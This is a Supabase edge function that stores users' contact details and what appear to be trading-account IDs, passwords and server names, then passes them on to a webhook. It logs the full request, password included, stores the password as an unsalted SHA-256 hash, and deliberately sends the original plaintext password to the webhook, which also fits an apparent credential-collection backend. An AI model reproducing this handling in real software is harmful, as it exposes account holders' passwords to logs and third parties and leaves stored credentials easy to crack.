import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.53.0'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const requestBody = await req.json();
    console.log('Store user account request:', requestBody);

    // Initialize Supabase client with service role key for bypassing RLS
    const supabaseAdmin = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    )

    const {
      firstName,
      lastName,
      email,
      phone,
      accountId,
      password,
      server,
      sessionId,
      referrerName,
      accountType
    } = requestBody;

    // Validate required fields
    if (!accountId || !password || !server) {
      return new Response(
        JSON.stringify({
          success: false,
          error: 'Missing required fields: accountId, password, server'
        }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400,
        }
      )
    }

    // Hash the password before storing using SHA-256 (avoid DB extension dependency)
    const sha256 = async (text: string) => {
      const data = new TextEncoder().encode(text);
      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      return hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
    };

    const hashedPassword = await sha256(password);

    // Check if account already exists
    const { data: existingAccount } = await supabaseAdmin
      .from('user_accounts')
      .select('id')
      .eq('account_id', accountId)
      .maybeSingle();

    let dbOperation = 'none';
    let dbError = null;

    if (existingAccount) {
      // Update existing account
      const { error: updateError } = await supabaseAdmin
        .from('user_accounts')
        .update({
          account_password: hashedPassword,
          server_name: server,
          user_name: firstName && lastName ? `${firstName} ${lastName}` : (firstName || ''),
          email: email || null,
          phone: phone || null,
          referrer_name: referrerName || null,
          session_id: sessionId || null,
          status: accountType === 'live' ? 'pending' : 'active',
        })
        .eq('account_id', accountId);
      
      dbError = updateError;
      dbOperation = 'update';
    } else {
      // Insert new account
      const { error: insertError } = await supabaseAdmin
        .from('user_accounts')
        .insert({
          account_id: accountId,
          account_password: hashedPassword,
          server_name: server,
          user_name: firstName && lastName ? `${firstName} ${lastName}` : (firstName || ''),
          email: email || null,
          phone: phone || null,
          referrer_name: referrerName || null,
          session_id: sessionId || null,
          status: accountType === 'live' ? 'pending' : 'active',
          created_at: new Date().toISOString()
        });
      
      dbError = insertError;
      dbOperation = 'insert';
    }

    if (dbError) {
      console.error(`Error during ${dbOperation} operation:`, dbError);
      // Don't return error immediately - still try to send webhook
    } else {
      console.log(`Successfully ${dbOperation}ed user account:`, accountId);
    }

    // Now call the webhook function to send notification (regardless of DB status)
    let webhookSuccess = false;
    try {
      const { data: webhookData, error: webhookError } = await supabaseAdmin.functions.invoke('send-account-webhook', {
        body: {
          account_id: accountId,
          account_password: password, // Send original password to webhook
          server_name: server,
          user_name: firstName && lastName ? `${firstName} ${lastName}` : (firstName || ''),
          email: email || null,
          phone: phone || null,
          referrer_name: referrerName || null,
          session_id: sessionId || null,
          account_type: accountType || 'demo'
        }
      });

      if (webhookError) {
        console.error('Webhook call failed:', webhookError);
      } else {
        console.log('Webhook sent successfully');
        webhookSuccess = true;
      }
    } catch (webhookErr) {
      console.error('Webhook error:', webhookErr);
    }

    // Return response based on both DB and webhook status
    if (dbError) {
      return new Response(
        JSON.stringify({
          success: false,
          error: 'Database operation failed',
          webhook_sent: webhookSuccess,
          account_id: accountId
        }),
        {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        }
      )
    }

    return new Response(
      JSON.stringify({
        success: true,
        message: 'User account stored successfully',
        webhook_sent: webhookSuccess,
        account_id: accountId
      }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200,
      }
    )

  } catch (error) {
    console.error('Store user account failed:', error);
    return new Response(
      JSON.stringify({
        success: false,
        error: error.message
      }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500,
      }
    )
  }
})